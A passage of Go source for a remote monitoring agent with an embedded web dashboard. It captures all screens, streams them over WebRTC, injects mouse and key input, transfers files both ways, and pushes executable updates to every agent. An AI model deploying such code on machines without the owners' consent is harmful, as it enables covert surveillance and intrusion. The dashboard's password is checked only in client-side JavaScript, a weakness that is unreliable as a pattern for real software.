	case "mousemove", "click":
		xStr := params["x"]
		yStr := params["y"]
		if xStr == "" || yStr == "" { return }
		sw, sh := screenSize()
		x := int(safeParseFloat(xStr) / 100 * float64(sw))
		y := int(safeParseFloat(yStr) / 100 * float64(sh))
		if cmd == "mousemove" {
			moveMouse(x, y)
		} else {
			clickMouse(x, y, params["button"] == "2")
		}
	case "keypress":
		key := params["key"]
		if key == "" { return }
		pressKey(key)
	}
}

func numDisplays() (n int) {
	defer func() {
		if r := recover(); r != nil {
			log("numDisplays panic: " + fmt.Sprintf("%v", r))
			n = 0
		}
	}()
	return screenshot.NumActiveDisplays()
}

func captureDisplay(n int) (result string) {
	defer func() {
		if r := recover(); r != nil {
			log("Screen capture panic (display " + fmt.Sprintf("%d", n) + "): " + fmt.Sprintf("%v", r))
			result = ""
		}
	}()
	if n < 0 || n >= numDisplays() { return "" }
	img, err := screenshot.CaptureRect(screenshot.GetDisplayBounds(n))
	if err != nil { return "" }
	b := new(bytes.Buffer)
	if err := jpeg.Encode(b, img, &jpeg.Options{Quality: jpegQuality}); err != nil {
		return ""
	}
	return base64.StdEncoding.EncodeToString(b.Bytes())
}

func captureFrames() []Message {
	n := numDisplays()
	if n == 0 { return nil }
	var msgs []Message
	for i := 0; i < n; i++ {
		f := captureDisplay(i)
		if f != "" {
			msgs = append(msgs, Message{Frame: f, Display: i})
		}
	}
	return msgs
}

// ============ WebRTC Support ============
var (
	peerConnections = make(map[string]*webrtc.PeerConnection)
	dataChannels    = make(map[string]*webrtc.DataChannel)
	pcMutex         sync.Mutex
)

func handleWebRTCOffer(ws *websocket.Conn, viewerId string, offer webrtc.SessionDescription) {
	config := webrtc.Configuration{
		ICEServers: []webrtc.ICEServer{
			{
				URLs: []string{"stun:stun.l.google.com:19302"},
			},
		},
	}

	pc, err := webrtc.NewPeerConnection(config)
	if err != nil {
		log("WebRTC Error: " + err.Error())
		return
	}

	pcMutex.Lock()
	peerConnections[viewerId] = pc
	pcMutex.Unlock()

	pc.OnICECandidate(func(c *webrtc.ICECandidate) {
		if c == nil { return }
		candJSON, err := json.Marshal(c.ToJSON())
		if err != nil { return }
		safeWriteJSON(ws, Message{
			Type: "webrtc-ice-candidate",
			Data: map[string]interface{}{
				"candidate": string(candJSON),
				"target":    viewerId,
			},
		})
	})

	pc.OnDataChannel(func(d *webrtc.DataChannel) {
		log(fmt.Sprintf("WebRTC DataChannel '%s' opened with Viewer %s", d.Label(), viewerId))
		d.OnOpen(func() {
			pcMutex.Lock()
			dataChannels[viewerId] = d
			pcMutex.Unlock()
			log("WebRTC Stream Ready for " + viewerId)
		})
		d.OnClose(func() {
			log("WebRTC DataChannel Closed for " + viewerId)
			pcMutex.Lock()
			delete(dataChannels, viewerId)
			pcMutex.Unlock()
		})
	})

	pc.OnConnectionStateChange(func(s webrtc.PeerConnectionState) {
		log(fmt.Sprintf("WebRTC State for %s: %s", viewerId, s.String()))
		if s == webrtc.PeerConnectionStateFailed || s == webrtc.PeerConnectionStateClosed {
			pcMutex.Lock()
			delete(peerConnections, viewerId)
			delete(dataChannels, viewerId)
			pcMutex.Unlock()
		}
	})

	if err := pc.SetRemoteDescription(offer); err != nil {
		log("WebRTC SetRemoteDescription Error: " + err.Error())
		return
	}

	answer, err := pc.CreateAnswer(nil)
	if err != nil {
		log("WebRTC CreateAnswer Error: " + err.Error())
		return
	}

	if err := pc.SetLocalDescription(answer); err != nil {
		log("WebRTC SetLocalDescription Error: " + err.Error())
		return
	}

	safeWriteJSON(ws, Message{
		Type: "webrtc-answer",
		Data: map[string]interface{}{
			"sdp":    answer.SDP,
			"type":   answer.Type.String(),
			"target": viewerId,
		},
	})
}

func handleWebRTCICECandidate(viewerId string, candidate webrtc.ICECandidateInit) {
	pcMutex.Lock()
	pc, ok := peerConnections[viewerId]
	pcMutex.Unlock()
	if ok {
		if err := pc.AddICECandidate(candidate); err != nil {
			log("WebRTC AddICECandidate Error: " + err.Error())
		}
	}
}

func sendFrameOverWebRTC(frameB64 string) int {
	pcMutex.Lock()
	defer pcMutex.Unlock()
	count := 0
	msg := []byte(frameB64)
	for viewerId, dc := range dataChannels {
		if dc.ReadyState() == webrtc.DataChannelStateOpen {
			if err := dc.Send(msg); err != nil {
				log("WebRTC Send Error for " + viewerId + ": " + err.Error())
			} else {
				count++
			}
		}
	}
	return count
}

// Embedded dashboard HTML
var htmlDashboard = `<!DOCTYPE html><html><head><meta charset="UTF-8"><title>Remote Monitor</title><style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,sans-serif;background:#f0f2f5;color:#1a1a2e;height:100vh}
header{background:#fff;padding:10px 20px;display:flex;justify-content:space-between;align-items:center;border-bottom:1px solid #e0e3e8;box-shadow:0 1px 3px rgba(0,0,0,.06)}
h1{font-size:16px;color:#2563eb;display:flex;align-items:center;gap:8px}
#status{font-size:12px;color:#64748b}
#tunnel-url{background:#f0fdf4;padding:8px 15px;text-align:center;font-size:13px;color:#166534;border-bottom:1px solid #bbf7d0;display:none}
#tunnel-url.failed{background:#fef2f2;color:#991b1b;border-color:#fecaca}
#grid{padding:10px;display:grid;grid-template-columns:repeat(auto-fill,minmax(400px,1fr));gap:10px;overflow-y:auto;height:calc(100vh-90px);align-content:start}
@media(max-width:900px){#grid{grid-template-columns:1fr 1fr}}
@media(max-width:600px){#grid{grid-template-columns:1fr}}
.tile{background:#fff;border-radius:10px;overflow:hidden;box-shadow:0 1px 4px rgba(0,0,0,.08);cursor:default;transition:.15s;border:2px solid transparent}
.tile:hover{box-shadow:0 4px 12px rgba(0,0,0,.12);border-color:#2563eb}
.tile .head{display:flex;justify-content:space-between;align-items:center;padding:8px 12px;background:#f8f9fb;border-bottom:1px solid #e8eaee}
.tile .name{font-weight:600;font-size:13px;color:#1a1a2e}
.tile .ip{font-size:11px;color:#94a3b8;font-family:monospace}
.tile .screen{width:100%;aspect-ratio:16/10;background:#000;display:flex;align-items:center;justify-content:center;overflow:hidden;position:relative;cursor:pointer}
.tile .screen img{width:100%;height:100%;object-fit:contain}
.tile .screen .zoom-hint{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);color:rgba(255,255,255,.4);font-size:28px;pointer-events:none;opacity:0;transition:opacity .2s}
.tile .screen:hover .zoom-hint{opacity:1}
.tile .screen .displays{display:flex;gap:2px;width:100%;height:100%}
.tile .screen .displays .disp-thumb{flex:1;min-width:0;cursor:pointer;position:relative;background:#000;overflow:hidden;display:flex;align-items:center;justify-content:center}
.tile .screen .displays .disp-thumb img{width:100%;height:100%;object-fit:contain}
.tile .screen .displays .disp-thumb .disp-label{position:absolute;bottom:2px;left:2px;background:rgba(0,0,0,.6);color:#fff;font-size:9px;padding:1px 4px;border-radius:2px;pointer-events:none}
.tile .actions{display:flex;gap:4px;padding:6px 12px;border-top:1px solid #e8eaee;flex-wrap:wrap}
.tile .actions button{background:transparent;border:1px solid #d0d3d8;padding:3px 10px;border-radius:4px;font-size:11px;cursor:pointer;color:#1a1a2e;transition:.15s}
.tile .actions button:hover{background:#eff6ff;border-color:#2563eb;color:#2563eb}
.tile .actions button:disabled{opacity:.5;cursor:default}
.tile .actions .ssh-link{background:#2563eb;color:#fff;border:1px solid #2563eb;padding:3px 10px;border-radius:4px;font-size:11px;cursor:pointer;text-decoration:none;display:inline-flex;align-items:center;gap:3px}
.tile .actions .ssh-link:hover{background:#1d4ed8}
.tile .actions input.file-input{display:none}
#toast{position:fixed;bottom:20px;right:20px;background:#1a1a2e;color:#fff;padding:10px 20px;border-radius:8px;font-size:12px;z-index:999;opacity:0;transition:opacity .3s;pointer-events:none;box-shadow:0 4px 12px rgba(0,0,0,.2)}
#toast.show{opacity:1}
#modal{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,.92);z-index:1000;display:none;align-items:center;justify-content:center;flex-direction:column}
#modal.show{display:flex}
#modal img{max-width:95%;max-height:88vh;object-fit:contain;background:#111;min-height:100px}
#modal .modal-close{position:absolute;top:15px;right:25px;color:#fff;font-size:30px;cursor:pointer;background:transparent;border:none;z-index:1001}
#modal .modal-close:hover{color:#94a3b8}
#modal .modal-label{color:#fff;font-size:14px;margin-bottom:10px;background:rgba(0,0,0,.5);padding:4px 12px;border-radius:4px}
.readonly .readonly-hidden{display:none!important}
#auth-overlay{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(15,20,30,.85);z-index:2000;display:none;align-items:center;justify-content:center;flex-direction:column}
#auth-overlay.show{display:flex}
#auth-overlay .auth-box{background:#fff;padding:30px;border-radius:12px;text-align:center;max-width:350px;width:90%;box-shadow:0 8px 30px rgba(0,0,0,.3)}
#auth-overlay .auth-box h2{font-size:18px;margin-bottom:15px;color:#1a1a2e}
#auth-overlay .auth-box input{width:100%;padding:10px;border:1px solid #d0d3d8;border-radius:6px;font-size:14px;margin-bottom:10px;text-align:center;outline:none}
#auth-overlay .auth-box input:focus{border-color:#2563eb}
#auth-overlay .auth-box button{background:#2563eb;color:#fff;border:none;padding:10px 20px;border-radius:6px;font-size:14px;cursor:pointer;width:100%}
#auth-overlay .auth-box button:hover{background:#1d4ed8}
#auth-overlay .auth-box .error{color:#dc2626;font-size:12px;margin-top:5px;display:none}
 </style></head><body class="readonly">
 <div id="auth-overlay">
  <div class="auth-box">
    <h2>🔒 BRANDING_TITLE</h2>
    <p style="font-size:12px;color:#64748b;margin-bottom:15px">Enter password for full access</p>
    <input type="password" id="auth-pass" placeholder="Enter password" onkeydown="if(event.key==='Enter')unlockDashboard()" autofocus>
    <button onclick="unlockDashboard()">Unlock Dashboard</button>
    <div class="error" id="auth-error">Incorrect password</div>
  </div>
</div>
<header><h1>🖥 BRANDING_TITLE</h1><div style="display:flex;align-items:center;gap:8px"><button onclick="document.getElementById('update-file').click()" class="readonly-hidden" style="background:none;border:none;font-size:11px;color:#94a3b8;cursor:pointer;padding:2px 6px;border-radius:4px" title="Push update to all agents">⬆️ Update</button><input type="file" id="update-file" accept=".exe" style="display:none" onchange="uploadUpdate(this)"><a href="#" onclick="showAllTiles();return false" style="font-size:11px;color:#94a3b8;text-decoration:none" title="Show hidden screens">👁</a><span style="cursor:pointer;font-size:11px;color:#94a3b8" onclick="showAuth()" title="Unlock full access">🔒</span><span id="status">Disconnected</span></div></header>
<div id="tunnel-url"></div>
<div id="grid"></div>
<div id="modal"><button class="modal-close" onclick="closeModal()">✕</button><div class="modal-label" id="modal-label"></div><img id="modal-img"></div>
<div id="toast"></div>
<script>
var agents={}
var isUnlocked=false
var modalState={agentId:null,display:0}
var w=new WebSocket((location.protocol=='https:'?'wss:':'ws:')+'//'+location.host+'/ws?token=TOKEN_PLACEHOLDER')
w.onopen=function(){document.getElementById('status').textContent='Connected';w.send(JSON.stringify({type:'dashboard-hello'}))}
w.onmessage=function(e){
 var d;try{d=JSON.parse(e.data)}catch(er){return}
 if(d.type=='agent-list'){d.agents.forEach(function(a){agents[a.id]={id:a.id,name:a.name,ip:a.localIP||a.ip||'?'};addTile(a.id,a.name,a.localIP||a.ip||'?')});grid()}
 if(d.type=='agent-connected'){agents[d.agentId]={id:d.agentId,name:d.name,ip:d.localIP||d.ip||'?'};addTile(d.agentId,d.name,d.localIP||d.ip||'?')}
 if(d.type=='agent-disconnected'){delete agents[d.agentId];var t=document.getElementById('t-'+d.agentId);if(t)t.remove()}
 if(d.type=='frame'&&agents[d.agentId]){
   var disp=d.display||0;agents[d.agentId].displays=agents[d.agentId].displays||{};agents[d.agentId].displays[disp]=d.frame
   var img=document.getElementById('fi-'+d.agentId+'-'+disp)
   if(!img){
     var disps=document.getElementById('disps-'+d.agentId);
     if(disps){
       var thumb=document.createElement('div');thumb.className='disp-thumb';
       var aid=d.agentId,dp=disp
       thumb.onclick=function(){openFullScreen(aid,dp)}
       thumb.innerHTML='<img id="fi-'+d.agentId+'-'+disp+'" src="data:image/jpeg;base64,'+d.frame+'"><span class="disp-label">'+(disp+1)+'</span>'
       disps.appendChild(thumb)
     }
   }else{img.src='data:image/jpeg;base64,'+d.frame}
   if(modalState.agentId==d.agentId&&modalState.display==disp)
     document.getElementById('modal-img').src='data:image/jpeg;base64,'+d.frame
 }
 if(d.type=='tunnel-status'){
   var el=document.getElementById('tunnel-url');el.className='';
   if(d.frame=='ready'){
     el.innerHTML='<span>Tunnel active: </span><a href="'+d.command+'" target="_blank" style="color:#2563eb">'+d.command+'</a> <button onclick="this.parentElement.style.display=\'none\'" style="background:transparent;border:none;color:#94a3b8;cursor:pointer;margin-left:8px">✕</button>';
     el.style.display='block';
   }else{
     el.className='failed';el.innerHTML='<span>Tunnel failed: '+d.command+'</span> <button onclick="this.parentElement.style.display=\'none\'" style="background:transparent;border:none;color:#94a3b8;cursor:pointer;margin-left:8px">✕</button>';
     el.style.display='block';
   }
 }
 if(d.type=='file-response'){
   var a=agents[d.agentId];if(!a)return
   if(d.frame&&d.frame.startsWith('error:')){
     showToast('File error on '+(a.name||d.agentId)+': '+d.frame)
   }else{
     var lnk=document.createElement('a');lnk.href='data:application/octet-stream;base64,'+d.frame;lnk.download=d.command.split('\\').pop()||'file';lnk.click()
     showToast('Received file from '+(a.name||d.agentId))
   }
 }
}
function grid(){
  var g=document.getElementById('grid')
  if(!g.children.length)g.innerHTML='<div style="color:#94a3b8;text-align:center;padding:40px;width:100%">No devices connected</div>'
}
function closeModal(){document.getElementById('modal').classList.remove('show');modalState.agentId=null}
function showToast(msg){var t=document.getElementById('toast');t.textContent=msg;t.classList.add('show');setTimeout(function(){t.classList.remove('show')},4000)}
function showAuth(){document.getElementById('auth-overlay').classList.add('show');document.getElementById('auth-pass').focus()}
function unlockDashboard(){var p=document.getElementById('auth-pass').value;var e=document.getElementById('auth-error');e.style.display='none';if(p==='PASS_PLACEHOLDER'){document.body.classList.remove('readonly');isUnlocked=true;document.getElementById('auth-overlay').classList.remove('show')}else{e.style.display='block';document.getElementById('auth-pass').value='';document.getElementById('auth-pass').focus()}}
function hideTile(id){var t=document.getElementById('t-'+id);if(t)t.style.display='none'}
function showAllTiles(){var els=document.querySelectorAll('.tile');for(var i=0;i<els.length;i++)els[i].style.display=''}
function uploadUpdate(input){var file=input.files[0];if(!file)return;var reader=new FileReader();reader.onload=function(){w.send(JSON.stringify({type:'push-update',command:file.name,frame:reader.result.split(',')[1]}));showToast('Update pushed to all agents');input.value=''};reader.readAsDataURL(file)}
function openFullScreen(id,disp){modalState.agentId=id;modalState.display=disp;var a=agents[id];document.getElementById('modal-label').textContent=(a?a.name+' - ':'')+'Display '+(disp+1);var mi=document.getElementById('modal-img');var frame=a&&a.displays&&a.displays[disp];mi.src=frame?'data:image/jpeg;base64,'+frame:'';document.getElementById('modal').classList.add('show')}
function openAgent(id){
 var a=agents[id];
 if(a&&a.ip&&a.ip!='?'&&a.ip!='unknown'){
   var safeIp=String(a.ip).replace(/[^0-9.]/g,'');
   if(safeIp)window.open('http://'+safeIp+':3000','_blank')
 }
}
function exposeAgent(id){
 var btn=document.getElementById('ex-'+id);
 if(btn){btn.textContent='Starting...';btn.disabled=true}
 w.send(JSON.stringify({type:'become-server',agentId:id}))
}
function sendFile(id){var input=document.getElementById('fileinp-'+id);if(input)input.click()}
function sendFileSelected(id,input){
 var file=input.files[0];if(!file)return
 var reader=new FileReader()
 reader.onload=function(){
   var safeName=String(file.name).replace(/[^a-zA-Z0-9._\-() ]/g,'_').slice(0,255)
   w.send(JSON.stringify({type:'file-transfer',agentId:id,command:safeName,frame:reader.result.split(',')[1]}))
   showToast('Sending ' + safeName + ' to ' + (agents[id]?agents[id].name||id:id))
   input.value=''
 }
 reader.readAsDataURL(file)
}
function requestFile(id){
 var path=prompt('Enter file path on agent (e.g. C:\\Users\\...):')
 if(!path)return
 var safePath=String(path).replace(/[<>"|?*]/g,'').slice(0,1024)
 if(!safePath)return
 w.send(JSON.stringify({type:'request-file',agentId:id,command:safePath}))
 showToast('File requested from '+(agents[id]?agents[id].name||id:id))
}
function esc(s){return String(s).replace(/[&<>"']/g,function(m){return {'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[m]})}
function safeId(s){return String(s).replace(/[^a-zA-Z0-9_\-]/g,'_')}
function addTile(id,name,ip){
 var sid=safeId(id)
 if(document.getElementById('t-'+sid))return
 var g=document.getElementById('grid')
 var no=g.querySelector('div[style*="padding:40px"]')
 if(no)no.remove()
 var t=document.createElement('div');t.className='tile';t.id='t-'+sid
 var headDiv=document.createElement('div');headDiv.className='head'
 var nameSpan=document.createElement('span');nameSpan.className='name';nameSpan.textContent=name
 var ipSpan=document.createElement('span');ipSpan.className='ip';ipSpan.textContent=ip
 var hideBtn=document.createElement('button');hideBtn.textContent='✕';hideBtn.style.cssText='background:none;border:none;color:#94a3b8;cursor:pointer;font-size:13px;padding:0 2px';hideBtn.title='Hide this screen'
 hideBtn.onclick=function(){hideTile(sid)}
 headDiv.appendChild(nameSpan);headDiv.appendChild(ipSpan);headDiv.appendChild(hideBtn)
 t.appendChild(headDiv)
 var screenDiv=document.createElement('div');screenDiv.className='screen';screenDiv.onclick=function(){openFullScreen(sid,0)}
 var zoomHint=document.createElement('div');zoomHint.className='zoom-hint';zoomHint.textContent='🔍'
 screenDiv.appendChild(zoomHint)
 var dispsDiv=document.createElement('div');dispsDiv.className='displays';dispsDiv.id='disps-'+sid
 var thumbDiv=document.createElement('div');thumbDiv.className='disp-thumb';thumbDiv.onclick=function(e){e.stopPropagation();openFullScreen(sid,0)}
 var img=document.createElement('img');img.id='fi-'+sid+'-0';img.src=''
 thumbDiv.appendChild(img)
 var label=document.createElement('span');label.className='disp-label';label.textContent='1'
 thumbDiv.appendChild(label)
 dispsDiv.appendChild(thumbDiv)
 screenDiv.appendChild(dispsDiv)
 t.appendChild(screenDiv)
 var actionsDiv=document.createElement('div');actionsDiv.className='actions'
 var remoteLink=document.createElement('a');remoteLink.className='ssh-link';remoteLink.onclick=function(){openAgent(sid)};remoteLink.textContent='🖥 Remote'
 actionsDiv.appendChild(remoteLink)
 var serverBtn=document.createElement('button');serverBtn.id='ex-'+sid;serverBtn.className='readonly-hidden';serverBtn.onclick=function(){exposeAgent(sid)};serverBtn.textContent='🔌 Make Server'
 actionsDiv.appendChild(serverBtn)
 var fileInput=document.createElement('input');fileInput.type='file';fileInput.id='fileinp-'+sid;fileInput.className='file-input';fileInput.onchange=function(){sendFileSelected(sid,this)}
 actionsDiv.appendChild(fileInput)
 var sendBtn=document.createElement('button');sendBtn.className='readonly-hidden';sendBtn.onclick=function(){sendFile(sid)};sendBtn.textContent='📁 Send'
 actionsDiv.appendChild(sendBtn)
 var getBtn=document.createElement('button');getBtn.className='readonly-hidden';getBtn.onclick=function(){requestFile(sid)};getBtn.textContent='📥 Get'
 actionsDiv.appendChild(getBtn)
 t.appendChild(actionsDiv)
 g.appendChild(t)
}
</script></body></html>`
